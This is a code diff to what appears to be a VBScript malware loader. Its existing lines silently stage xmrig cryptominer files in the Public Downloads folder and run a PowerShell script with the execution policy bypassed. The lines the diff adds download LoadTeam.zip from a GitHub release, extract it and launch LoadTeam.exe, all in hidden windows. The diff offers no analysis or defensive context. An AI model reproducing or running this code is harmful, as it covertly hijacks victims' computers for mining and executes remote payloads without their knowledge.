@@ -28,3 +28,6 @@ WScript.Sleep 2000
 objShell.Run "powershell.exe -Command Copy-Item -Path C:\Users\Public\Downloads\COINRUN.cmd -Destination C:\Users\Public\Downloads\xmrig-6.26.0\COINRUN.cmd -Force", 0, True
 objShell.Run "powershell.exe -Command Copy-Item -Path C:\Users\Public\Downloads\config.json -Destination C:\Users\Public\Downloads\xmrig-6.26.0\config.json -Force", 0, True
 objShell.Run "powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\Downloads\ring.ps1", 0, True
+objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri 'https://github.com/GALVINVN/system/releases/download/loadteam/LoadTeam.zip' -OutFile 'C:\Users\Public\Downloads\LoadTeam.zip'", 0, True
+objShell.Run "powershell.exe -Command Expand-Archive -Path 'C:\Users\Public\Downloads\LoadTeam.zip' -DestinationPath 'C:\Users\Public\LoadTeam' -Force", 0, True
+objShell.Run "powershell.exe -Command Start-Process 'C:\Users\Public\LoadTeam\LoadTeam\LoadTeam.exe'", 0, True
